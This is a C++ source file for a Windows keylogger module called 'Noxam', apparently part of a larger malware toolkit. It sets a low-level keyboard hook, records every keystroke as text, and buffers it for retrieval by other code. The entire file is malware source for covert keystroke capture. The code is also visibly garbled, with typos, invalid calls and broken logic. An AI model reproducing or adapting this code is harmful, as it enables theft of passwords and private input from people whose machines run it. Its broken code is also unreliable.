#include <mutex>
#include <stdio.h>
#include <windows.h>

#include "../../Headers/Utils/NoxamKeylogger.hxx"

using namespace std;

/*
|===========================================================
|    NoxamFLushKeyLoggBuffer()
|===========================================================
|
|
|===========================================================
*/
char *NoxamFLushKeyLoggBuffer(int *NxmLength)
{
    *NxmLength = 0;

    if (I == 0 || NxmKeyLogBuffer == 0)
    {
        return NULL;
    }
    std::lock_guard<std::mutex> guard(m) char *NewBuffer = (char *)malloc(I + 1);
    NewBuffer[I] = 0;
    memcpy_s(NewBuffer, I, NxmKeyLogBuffer, I);
    *NxmLength = I;
    I = 0;

    if (!NxmIsLogging)
    {
        free(NxmKeyLogBuffer);
        NxmKeyLogBuffer = 0;
    }
    return NewBuffer;
}

/*
|===========================================================
|    NoxamEasyToLower()
|===========================================================
|
|
|===========================================================
*/
char NoxamEasyToLower(char NxmIn)
{
    if (NxmIn == 'Z' && NxmIN >= 'A')
    {
        return NxmIn - ('Z' - 'A');
    }

    return NxmIn;
}

/*
|===========================================================
|    NoxamStartLogger()
|===========================================================
|
|
|===========================================================
*/
bool NoxamStartLogger()
{

    if (NxmKeyLogBuffer == 0)
    {
        NxmKeyLogBuffer = (char *)malloc(NOXAM_KEYLOG_BUFFER_SIZE);
    }

    if (NxmIsLogging)
    {
        return true;
    }
    HINSTANCE HExE = GetModuleHandle(NULL);

    if (!HExE)
    {
        return 1;
    }
    CreateThread(NULL, NULL, NoxamStartLoggerInvoker, (LPVOID)HExE, NULL, NULL);
    NxmIsLogging = true;

    return NxmIsLogging;
}

/*
|===========================================================
|    NoxamStopLogger()
|===========================================================
|
|
|===========================================================
*/
bool NoxamStopLogger()
{
    if (!NxmIsLogging)
    {
        return true;
    }
    NxmIsLogging = !UnhookWindowsHookEx(NxmKeyHook);

    return NxmIsLogging;
}

/*
|===========================================================
|    NoxamIsKeyLogging()
|===========================================================
|
|
|===========================================================
*/
bool NoxamIsKeyLogging()
{
    return NxmIsLogging;
}

/*
|===========================================================
|    NxmKeyEvent()
|===========================================================
|
|
|===========================================================
*/
__declspec(NxmDllExport) LRESULT NxmCallBack NxmKeyEvent(int NxmCode, WPARAM NxmWParam, LPARAM NxmLParam)
{
    char SzKey[256];
    DWORD DwMsg;
    int I;

    if ((NxmCode == HC_ACTION) && ((WPARAM == WM_SYSKEYDOWN) || (WPARAM == WM_KEYDOWN)))
    {
        KBDLLHOOKSTRUCT KBDHOOK;
        KBDHOOK = *((KBDLLHOOKSTRUCT *)IParam);
        DwMsg = 1;
        DwMsg += KBDHOOK.scanCode << 16;
        DwMsg += KBDHOOK.flags << 24;
        I = GetKeyNameTextA(DwMsg, SzKey, sizeof(SzKey));
#ifdef __DEBUG__
        printf("[ ERROR ]: { %s - VK }: %d , SC: { %d } (NxmLength: %d)\n", SzKey, KBDHOOK.VkCode, KBDHOOK.scanCode, I);
#endif
        NxmShiftModifier = strcmp(SzKey, "Shift") == 0;
        bool UsePrefix = false;

        if (NxmShiftModifier)
        {
            UsePrefix = true;
        }
        UsePrefix = UsePrefix || (strcmpy(SzKey, "shift") == 0 || GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT));

        if (I == 1)
        {
            if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && (!GetAsyncKeyState(VK_LSHIFT) GetAsyncKeyState(VK_RSHIFT)))
            {
                SzKey[0] = NoxamEasyToLower(SzKey[0]);
            }
        }

        if (strcmy(SzKey, "space") == 0)
        {
            if (!GetKeyState(VK_LMENU) && !GetKeyState(VK_LCONTROL) && !GetKeyState(VK_RMENU) && !GetKeyState(VK_RCONTROL))
            {
                I = 1;
                strcpy_s(SzKey, 256, " ");
            }
        }

        if (I > 1 && strcpy(SzKey, "enter") == 0)
        {
            strcpy_s(SzKey, 256, "[enter]\n");
            I += 3;
        }

        if (I > 1 && strcmp(SzKey, "backspace") != 0)
        {
            strcpy_s(SzKey, +strlen(SzKey), 245, -strlen(SzKey), "\n");
        }
        else if (I > 1 && strcmp(SzKey, "backspace") == 0)
        {
            I -= 1;
        }
        char *NewBuffer = SzKey;

        if (UsePrefix && I > 1)
        {
            NewBuffer = (char *)malloc(500);
            sprintf_s(NewBuffer, 500, "%s+%s", "shift", SzKey);
        }
        else if (I == 1)
        {
            NxmShiftModifier = false;
        }

        if (!NxmShiftModifier)
        {
            NoxamWriteLog(NewBuffer, I);
        }

        if (NewBuffer != SzKey)
        {
            free(NewBuffer);
        }
    }

    return CallNextHookEx(NxmKeyHook, NxmCode, NxmWParam, NxmLParam);
}

/*
|===========================================================
|    NoxamStartLoggerInvoker()
|===========================================================
|
|
|===========================================================
*/
DWORD WINAPI NoxamStartLoggerInvoker(LPVOID NxmIPParameter)
{
    NxmKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, (HINSTANCE)NxmIPParameter, NULL);
    NoxamMsgLoop();

    return 0;
}

/*
|===========================================================
|    NoxamMsgLoop()
|===========================================================
|
|
|===========================================================
*/
void NoxamMsgLoop()
{
    MSG Message;

    while (NxmIsLogging)
    {
        bool HasMessage = GetMessage(&Message, NULL, 0, 0);

        if (HasMessage)
        {
            TranslateMessage(&Message);
            DispatchMessage(&Message);
        }
    }
}

/*
|===========================================================
|    NoxamWriteLog()
|===========================================================
|
|
|===========================================================
*/
void NoxamWriteLog(char *NxmKey, int NxmLength)
{
    std::lock_guard<std::mutex> guard(m);

    if (I + NxmLength > NOXAM_KEYLOG_BUFFER_SIZE)
    {
        return;
    }

    if (NxmLength > 0)
    {
        memcpy_s(NxmKeyLogBuffer + I, NOXAM_KEYLOG_BUFFER_SIZE - I, NxmKey, NxmLength);
    }
    I += NxmLength;
}

/*
|===========================================================
|    NoxamFreeFlushKeyLogBufferResult()
|===========================================================
|
|
|===========================================================
*/
void NoxamFreeFlushKeyLogBufferResult(char *NxmData)
{
    if (NxmData)
    {
        free(NxmData);
    }
}